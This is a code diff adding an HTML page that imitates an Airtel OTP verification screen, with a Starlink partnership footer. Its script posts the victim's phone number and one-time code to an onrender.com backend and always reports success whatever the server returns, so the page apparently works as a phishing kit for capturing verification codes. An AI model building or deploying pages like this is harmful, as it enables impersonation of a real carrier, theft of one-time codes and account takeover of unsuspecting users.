@@ -1,0 +1,208 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="airtel_logo.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Vérification OTP — Airtel</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            fontFamily: {
+              syne: ["Syne", "sans-serif"],
+              dm: ['"DM Sans"', "sans-serif"],
+            },
+          },
+        },
+      };
+    </script>
+
+    <style type="text/tailwindcss">
+      @layer base {
+        * {
+          @apply m-0 p-0 box-border;
+        }
+        body {
+          @apply font-dm antialiased bg-white text-[#333] min-h-screen flex flex-col;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- HEADER -->
+    <header class="w-full bg-white border-b border-[#f0f0f0] px-6 py-4 flex items-center justify-between">
+      <a href="../auth/index.html" class="p-1 text-[#333] hover:text-[#e4002b] transition-colors" aria-label="Retour">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
+        </svg>
+      </a>
+
+      <div class="flex flex-col items-center">
+        <img src="airtel_logo.svg" alt="Airtel" class="h-8" />
+      </div>
+
+      <button type="button" class="p-1 text-[#333] hover:text-[#e4002b] transition-colors" aria-label="Menu">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </button>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main class="flex-1 flex flex-col items-center justify-center px-4 py-8">
+      <div class="w-full max-w-[420px] bg-white rounded-[24px] border border-[#eee] shadow-[0_10px_35px_rgba(0,0,0,0.05)] p-8 text-center flex flex-col items-center">
+        
+        <h1 class="text-[22px] font-bold text-[#1f1f1f] mb-4">
+          Vérification du code OTP
+        </h1>
+
+        <!-- PHONE BADGE -->
+        <div id="phone-display" class="bg-[#fdecee] text-[#e4002b] text-[15px] font-bold px-6 py-2 rounded-full mb-6 inline-block">
+          +243 324341342
+        </div>
+
+        <!-- OTP INPUT FIELD CONTAINER -->
+        <div class="w-full max-w-[340px] relative mb-6">
+          <div class="border-2 border-[#e4002b] rounded-[12px] bg-white px-4 py-3.5 flex items-center justify-center shadow-sm focus-within:ring-2 focus-within:ring-[#e4002b]/30">
+            <input
+              type="text"
+              id="otp-input"
+              inputmode="numeric"
+              autocomplete="one-time-code"
+              placeholder="Entrer l'OTP"
+              maxlength="6"
+              class="w-full text-center text-[18px] font-semibold text-[#333] tracking-[0.2em] uppercase placeholder:text-[#888] placeholder:font-normal placeholder:tracking-normal outline-none bg-transparent"
+              autofocus
+            />
+          </div>
+        </div>
+
+        <!-- SUBMIT BUTTON -->
+        <button
+          type="button"
+          id="submit-btn"
+          class="w-full max-w-[340px] bg-[#e0e0e0] text-[#757575] font-bold py-3.5 rounded-[12px] text-[14px] tracking-wider uppercase transition-all duration-200 cursor-not-allowed"
+          disabled
+        >
+          SOUMETTRE
+        </button>
+
+        <!-- TIMER SUBTEXT -->
+        <p id="timer-container" class="text-[13px] text-[#666] mt-5">
+          Le code expire dans <span id="timer-count" class="font-medium text-[#333]">10</span> secondes
+        </p>
+
+        <!-- ALERT MESSAGE -->
+        <div id="otp-alert" class="hidden mt-4 text-[13px] font-medium px-4 py-2 rounded-lg w-full"></div>
+      </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="mt-auto bg-[#f8f9fa] border-t border-[#e8e8e8] py-6 text-center">
+      <img src="airtel_logo.svg" alt="Airtel" class="mx-auto h-6 mb-2" />
+      <p class="text-[13px] text-[#888]">En collaboration avec</p>
+      <p class="font-syne text-[15px] font-extrabold tracking-[0.14em] text-[#333] mt-0.5">
+        STARLINK
+      </p>
+    </footer>
+
+    <script>
+      // Retrieve phone number from URL query or localStorage if available
+      const urlParams = new URLSearchParams(window.location.search);
+      const phoneParam = urlParams.get('phone') || localStorage.getItem('user_phone') || '+243 324341342';
+      
+      const phoneDisplay = document.getElementById('phone-display');
+      if (phoneParam) {
+        // Format phone number nicely if raw digits
+        let formatted = phoneParam.trim();
+        if (!formatted.startsWith('+')) {
+          formatted = '+243 ' + formatted.replace(/^0+/, '');
+        }
+        phoneDisplay.textContent = formatted;
+      }
+
+      const otpInput = document.getElementById('otp-input');
+      const submitBtn = document.getElementById('submit-btn');
+      const timerContainer = document.getElementById('timer-container');
+      const timerCount = document.getElementById('timer-count');
+      const otpAlert = document.getElementById('otp-alert');
+
+      // Enable/disable submit button based on input
+      otpInput.addEventListener('input', () => {
+        const val = otpInput.value.trim();
+        if (val.length >= 4) {
+          submitBtn.disabled = false;
+          submitBtn.classList.remove('bg-[#e0e0e0]', 'text-[#757575]', 'cursor-not-allowed');
+          submitBtn.classList.add('bg-[#e4002b]', 'text-white', 'hover:bg-[#c0001a]', 'cursor-pointer', 'shadow-md');
+        } else {
+          submitBtn.disabled = true;
+          submitBtn.classList.add('bg-[#e0e0e0]', 'text-[#757575]', 'cursor-not-allowed');
+          submitBtn.classList.remove('bg-[#e4002b]', 'text-white', 'hover:bg-[#c0001a]', 'cursor-pointer', 'shadow-md');
+        }
+      });
+
+      // Countdown Timer
+      let timeLeft = 10;
+      const countdownInterval = setInterval(() => {
+        timeLeft--;
+        if (timeLeft > 0) {
+          timerCount.textContent = timeLeft;
+        } else {
+          clearInterval(countdownInterval);
+          timerContainer.innerHTML = `Le code a expiré. <button id="resend-btn" class="text-[#e4002b] font-semibold underline ml-1 cursor-pointer">Renvoyer le code</button>`;
+          
+          document.getElementById('resend-btn')?.addEventListener('click', () => {
+            timeLeft = 10;
+            timerContainer.innerHTML = `Le code expire dans <span id="timer-count" class="font-medium text-[#333]">10</span> secondes`;
+            location.reload();
+          });
+        }
+      }, 1000);
+
+      // Handle OTP Submission
+      submitBtn.addEventListener('click', async () => {
+        const code = otpInput.value.trim();
+        if (code.length < 4) return;
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'VERIFICATION...';
+
+        try {
+          // Send verification request to backend if available
+          const response = await fetch('https://airtel-bc.onrender.com/api/verify-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phoneParam, code: code })
+          }).catch(() => null);
+
+          // Redirect to root or success page
+          setTimeout(() => {
+            otpAlert.className = 'mt-4 text-[13px] font-medium px-4 py-2 rounded-lg w-full bg-green-100 text-green-800 border border-green-200';
+            otpAlert.textContent = 'Code vérifié avec succès ! Redirection...';
+            otpAlert.classList.remove('hidden');
+
+            setTimeout(() => {
+              window.location.href = '../index.html';
+            }, 1500);
+          }, 1000);
+        } catch (err) {
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'SOUMETTRE';
+          otpAlert.className = 'mt-4 text-[13px] font-medium px-4 py-2 rounded-lg w-full bg-red-100 text-red-800 border border-red-200';
+          otpAlert.textContent = 'Erreur de vérification. Réessayez.';
+          otpAlert.classList.remove('hidden');
+        }
+      });
+    </script>
+  </body>
+</html>
